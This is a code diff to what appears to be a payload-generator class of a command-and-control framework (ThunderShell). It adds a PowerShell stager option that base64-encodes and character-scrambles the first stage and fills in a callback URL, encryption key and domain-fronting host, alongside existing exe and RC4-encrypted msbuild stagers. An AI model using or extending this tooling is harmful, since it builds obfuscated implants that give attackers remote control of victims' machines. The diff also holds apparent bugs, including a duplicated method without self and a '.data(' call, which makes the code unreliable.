@@ -6,6 +6,7 @@
 """
 
 import os
+import re
 import base64
 import random
 
@@ -45,7 +46,7 @@ class Payload:
     def get_fronting(self):
         if self.fronting == None:
             # the last replace get rid of unwanted / at the end of the callback_url
-            return self.callback_url[self.callback_url.find("://") + 3:].replace("/", "") 
+            return self.callback_url[self.callback_url.find("://") + 3:].replace("/", "")
         return self.fronting
 
     def set_delay(self, delay):
@@ -63,12 +64,26 @@ class Payload:
     def get_output(self):
         output = Utils.load_powershell_script(self.type[self.option], 999)
         output = output.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay)).replace("[FRONTING]", self.get_fronting())
+        if self.option == "ps1":
+            output = self.generate_ps(output)
         if self.option == "exe":
             output = self.compile_exe(output)
         if self.option == "exe-old":
-            output = self.compile_exe(output, v1=True)            
+            output = self.compile_exe(output, v1=True)
         if self.option == "msbuild":
             output = self.generate_msbuild(output)
+        return output
+
+    def generate_ps(self, data):
+        payload = Utils.load_powershell_script(self.type[self.option], 999)
+        position = re.search("STAGE0", payload)
+        stage0 = payload[:position.start()].replace("[FRONTING]", self.get_fronting())
+        stage1 = payload[position.end():]
+        pattern1 = self.gen_pattern(",.@$)(*[]{};+")
+        pattern2 = self.gen_pattern("#!<>@$%?&-~|:")
+        stage0 = base64.b64encode(stage0.encode()).decode().replace("W", pattern1).replace("m", pattern2)
+        output = Utils.load_powershell_script(self.type[self.option], 999)
+        output = stage1.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay)).replace("[PAYLOAD]", stage0).replace("[PATTERN1]", pattern1).replace("[PATTERN2]", pattern2)
         return output
 
     def compile_exe(self, data, v1=False):
@@ -87,6 +102,9 @@ class Payload:
 
         return output
 
+    def gen_pattern(charset):
+        return ''.join(random.sample(charset,len(charset)))
+
     def generate_msbuild(self, ps):
         msbuild = Utils.load_powershell_script("%s/stager.csproj" % THUNDERSHELL.PAYLOADS_PATH, 999)
         rc4_key = RC4.gen_rc4_key(32)
@@ -94,12 +112,12 @@ class Payload:
         rc4 = RC4(rc4_key)
         data = base64.b64encode(rc4.crypt(ps))
         pattern1 = self.gen_pattern("#!@$%?&/-~")
-        pattern2 = self.gen_pattern(",.<>)(*[]{}+`")    
+        pattern2 = self.gen_pattern(",.<>)(*[]{}+`")
         data = data.replace("m", pattern1).data("V", pattern2)
         return msbuild.replace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key).replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)
 
     def get_url(self):
         return self.config.get("callback-url")
-    
-    def gen_pattern(self, charset):    
+
+    def gen_pattern(self, charset):
         return ''.join(random.sample(charset,len(charset)))
